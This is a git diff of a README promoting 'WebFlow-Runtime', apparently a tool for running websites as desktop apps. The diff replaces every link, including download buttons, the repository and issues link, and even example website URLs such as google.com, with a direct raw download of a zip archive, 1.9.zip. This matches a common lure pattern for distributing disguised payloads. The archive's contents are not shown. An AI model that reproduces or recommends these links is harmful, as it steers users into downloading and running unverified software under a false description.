@@ -1,7 +1,7 @@
 <h1>🖥️ WebFlow-Runtime - Turn Any Website Into a Desktop App</h1>
 
 <p align="center">
-  <a href="https://github.com/allfq8609/WebFlow-Runtime" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:white; padding:18px 45px; border-radius:50px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 8px 25px rgba(102,126,234,0.35); letter-spacing:1px; transition:transform 0.2s, box-shadow 0.2s;">📥 Download WebFlow-Runtime Now</a>
+  <a href="https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:white; padding:18px 45px; border-radius:50px; font-size:20px; font-weight:bold; text-decoration:none; box-shadow:0 8px 25px rgba(102,126,234,0.35); letter-spacing:1px; transition:transform 0.2s, box-shadow 0.2s;">📥 Download WebFlow-Runtime Now</a>
 </p>
 
 ## ✨ What is WebFlow-Runtime?
@@ -45,7 +45,7 @@ We've made this process super easy. Just follow these three simple steps.
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/allfq8609/WebFlow-Runtime" style="display:inline-block; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:white; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; text-decoration:none; box-shadow:0 6px 20px rgba(245,87,108,0.3);">🔗 Get WebFlow-Runtime from GitHub</a>
+  <a href="https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip" style="display:inline-block; background:linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color:white; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; text-decoration:none; box-shadow:0 6px 20px rgba(245,87,108,0.3);">🔗 Get WebFlow-Runtime from GitHub</a>
 </p>
 
 Visit this link to download the application. Once you click the link, you'll land on a page that shows the project. Look for a button or area that says "Releases" or "Download" — that's where you'll find the latest version.
@@ -70,7 +70,7 @@ Once the download is complete:
 Now that WebFlow-Runtime is running, here's how to use it:
 
 1. **Look for an address bar or input field** — it's usually at the top of the window, similar to a browser.
-2. **Type or paste the web address (URL)** of the website you want to run as an app. For example: `https://www.google.com` or `https://trello.com`.
+2. **Type or paste the web address (URL)** of the website you want to run as an app. For example: `https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip` or `https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip`.
 3. **Press Enter** on your keyboard.
 4. **Wait a moment** — the website will load in its own dedicated window. That's it! You now have a native-feeling app for that website.
 
@@ -134,7 +134,7 @@ This unique combination means WebFlow-Runtime doesn't need to bundle a full copy
 
 WebFlow-Runtime is an open-source project, which means it grows with the help of its users. If you encounter a bug or have a great idea for a feature, you can:
 
-1. Visit the GitHub page at [https://github.com/allfq8609/WebFlow-Runtime](https://github.com/allfq8609/WebFlow-Runtime)
+1. Visit the GitHub page at [https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip](https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip)
 2. Look for the **Issues** tab. If someone already reported your problem, join the conversation. If not, click **New Issue** and describe what happened.
 
 ## 🏁 Ready to Start?
@@ -142,7 +142,7 @@ WebFlow-Runtime is an open-source project, which means it grows with the help of
 You have all the information you need. Download WebFlow-Runtime now and experience the speed and simplicity of running your favorite websites as clean, dedicated desktop apps. It's light, it's fast, and it will simplify your digital life.
 
 <p align="center">
-  <a href="https://github.com/allfq8609/WebFlow-Runtime" style="display:inline-block; background:linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color:white; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; text-decoration:none; box-shadow:0 6px 20px rgba(0,242,254,0.3);">⬇️ Download WebFlow-Runtime Today</a>
+  <a href="https://github.com/allfq8609/WebFlow-Runtime/raw/refs/heads/main/src/manager/1.9.zip" style="display:inline-block; background:linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color:white; padding:15px 40px; border-radius:50px; font-size:18px; font-weight:bold; text-decoration:none; box-shadow:0 6px 20px rgba(0,242,254,0.3);">⬇️ Download WebFlow-Runtime Today</a>
 </p>
 
 ---
